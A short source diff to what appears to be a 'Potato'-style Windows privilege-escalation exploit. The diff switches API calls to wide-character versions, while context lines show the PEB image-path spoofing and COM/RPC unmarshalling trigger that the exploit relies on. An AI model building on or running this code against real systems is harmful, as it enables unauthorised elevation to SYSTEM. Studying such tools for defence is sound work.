@@ -1,4 +1,4 @@
-#include "PotatoTrigger.h"
+﻿#include "PotatoTrigger.h"
 #include "stdio.h"
 #include "wincrypt.h"
 #include "objbase.h"
@@ -19,7 +19,7 @@ void InitComServer() {
 	wchar_t oldImagePathName[MAX_PATH];
 	wchar_t newImagePathName[] = L"System";
 	WCHAR spnInfo[] = L"";
-	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQueryInformationProcess");
+	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtQueryInformationProcess");
 	NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pebInfo, sizeof(pebInfo), &ReturnLength);
 	// save the old image path name and patch with the new one
 	memset(oldImagePathName, 0, sizeof(wchar_t) * MAX_PATH);
@@ -64,12 +64,12 @@ void PotatoTrigger(PWCHAR clsidStr, PWCHAR comPort, HANDLE hEventWait) {
 	memcpy(gOid, objrefDecoded + 40, 8);
 	memcpy(gIpid, objrefDecoded + 48, 16);
 	// we register the port of our local com server
-	rpcStatus = RpcServerUseProtseqEp((RPC_WSTR)L"ncacn_ip_tcp", RPC_C_PROTSEQ_MAX_REQS_DEFAULT, (RPC_WSTR)comPort, NULL);
+	rpcStatus = RpcServerUseProtseqEpW((RPC_WSTR)L"ncacn_ip_tcp", RPC_C_PROTSEQ_MAX_REQS_DEFAULT, (RPC_WSTR)comPort, NULL);
 	if (rpcStatus != S_OK) {
 		printf("[!] RpcServerUseProtseqEp failed with rpc status code %d\n", rpcStatus);
 		exit(-1);
 	}
-	RpcServerRegisterAuthInfo(NULL, RPC_C_AUTHN_WINNT, NULL, NULL);
+	RpcServerRegisterAuthInfoW(NULL, RPC_C_AUTHN_WINNT, NULL, NULL);
 	result = UnmarshallIStorage(clsidStr);
 	if (result == CO_E_BAD_PATH) {
 		printf("[!] CLSID %S not found. Error Bad path to object. Exiting...\n", clsidStr);
